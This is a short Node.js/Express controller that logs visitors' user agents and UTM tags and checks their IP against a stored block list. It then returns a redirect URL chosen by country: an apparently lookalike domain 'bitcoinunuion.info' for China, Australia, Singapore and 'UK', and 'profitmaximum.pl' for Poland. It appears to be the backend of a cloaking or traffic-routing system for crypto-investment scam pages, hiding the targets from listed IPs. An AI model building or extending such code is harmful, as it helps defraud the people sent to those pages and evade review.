const geoip = require('geoip-lite');
const Ip = require('../models/IpAddress');
const UserAgent = require('../models/UserAgent');
const errorHandler = require('../utils/errorHandler');

module.exports.getUrl = async function (req, res) {
    const userAgent = new UserAgent({
        UserAgent: req.body.UserAgent,
        UTM: req.body.UTM
    });
    try {
        await userAgent.save()
        const blackIp = await Ip.findOne({ip: req.ip})
        if (blackIp) {
            res.status(200).json(false)
        } else {
            let url = checkCountry(req.ip)
            res.status(200).json({status: true,
            url: url})
        }

    } catch (e) {
        errorHandler(res, e)
    }
}

function checkCountry(ip) {
    let geo = geoip.lookup(ip);
    switch (geo.country) {
        case "CN":
            return url = 'bitcoinunuion.info'
        case "UK":
            return url = 'bitcoinunuion.info'
        case "AU":
            return url = 'bitcoinunuion.info'
        case "SG":
            return url = 'bitcoinunuion.info'
        case "PL":
            return url = 'profitmaximum.pl'
        default:
            return url = 'test.com';
    }
    return url
}